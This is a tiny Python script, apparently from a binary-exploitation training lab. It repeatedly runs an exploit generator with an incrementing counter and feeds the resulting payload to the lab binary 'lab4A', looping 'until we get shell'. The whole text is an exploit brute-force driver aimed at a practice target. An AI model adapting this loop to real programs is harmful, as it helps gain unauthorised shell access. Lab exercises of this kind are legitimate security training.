import os
i=0
while True: #Run until we get shell,press Ctrl+Z to exit
        os.system("python3 /tmp/4A_exploit.py {}".format(i))
        os.system("/levels/lab04/lab4A $(cat /tmp/4A_payload)")
        i+=1
